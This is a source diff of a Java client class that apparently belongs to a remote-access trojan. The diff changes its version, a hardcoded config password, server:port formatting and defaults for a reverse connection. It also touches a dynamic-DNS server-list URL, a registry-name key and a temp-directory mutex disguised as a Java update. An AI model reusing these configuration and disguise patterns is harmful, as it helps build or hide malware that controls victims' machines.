@@ -16,9 +16,9 @@ public class Inicio {
 
     public static CFG config;
     public static Interfaz in;//instalador
-    public static String v = "1.5.7";//version
+    public static String v = "2.0.2";//version
     public static String i = "";//identificador
-    public static String pCCON = "LAOSUISNPASD12378ASDLGASDHGAKD"; //password del archivo de configuracion
+    public static String pCCON = "ALSKJDAO LAJSDOASL DALSKDJAOSIUD ASDA"; //password del archivo de configuracion
     private static File f;
     private static FileChannel channel;
     private static FileLock lock;
@@ -49,9 +49,9 @@ public class Inicio {
                 c++;
                 if ((Boolean) serv.get(1)) {
                     if (c == con.size()) {
-                        r.append((String) serv.get(2));
+                        r.append((String) serv.get(2)).append(":").append(serv.get(3));
                     } else {
-                        r.append((String) serv.get(2)).append(" - ");
+                        r.append((String) serv.get(2)).append(":").append(serv.get(3)).append(" - ");
                     }
                 }
             }
@@ -68,9 +68,9 @@ public class Inicio {
             for (Interfaz serv : con) {
                 c++;
                 if (c == con.size()) {
-                    r.append((String) serv.get(2));
+                    r.append((String) serv.get(2)).append(":").append(serv.get(3));
                 } else {
-                    r.append((String) serv.get(2)).append(" - ");
+                    r.append((String) serv.get(2)).append(":").append(serv.get(3)).append(" - ");
                 }
             }
         } catch (Exception e) {
@@ -185,10 +185,10 @@ public class Inicio {
 //            Inicio.config = new CFG();
 //            Inicio.config.inicializarParamertros();
 //            Inicio.config.agregarParametro("gui", Boolean.FALSE);
-//            Inicio.config.agregarParametro("dns", "");
-//            Inicio.config.agregarParametro("urlDns", "http://rtdns.ddns.net/list.txt");
+//            Inicio.config.agregarParametro("dns", "localhost:4000");
+////            Inicio.config.agregarParametro("urlDns", "http://rtdns.ddns.net/list.txt");
 //            Inicio.config.agregarParametro("claveClase", "");
-//            Inicio.config.agregarParametro("delay", 0);
+//            Inicio.config.agregarParametro("delay", 3000);
 //            Inicio.config.agregarParametro("prefijo", "");
 //            Inicio.config.agregarParametro("off-escritorio", Boolean.FALSE);
 //            Inicio.config.agregarParametro("off-escritorio-delay", 3000);
@@ -198,7 +198,7 @@ public class Inicio {
 //            Inicio.config.agregarParametro("regName", "");
 //            Inicio.config.agregarParametro("ssl", Boolean.TRUE);
 //            Inicio.config.agregarParametro("tipoConexion", 1);//inversa
-//            Inicio.config.agregarParametro("protocolo", ConexionServer.TCP);
+//            Inicio.config.agregarParametro("protocolo", 1);//ConexionServer.TCP
         }
     }
 
@@ -217,7 +217,6 @@ public class Inicio {
     //revisa el mutex
     private void rm() {
         try {
-//            f = new File(System.getProperty("java.io.tmpdir"), "orajupdatev2.lock");
             //servidores diferentes, mutex diferentes
             f = new File(System.getProperty("java.io.tmpdir"), "orajupdatev" + v + ".lock");
             channel = new RandomAccessFile(f, "rw").getChannel();
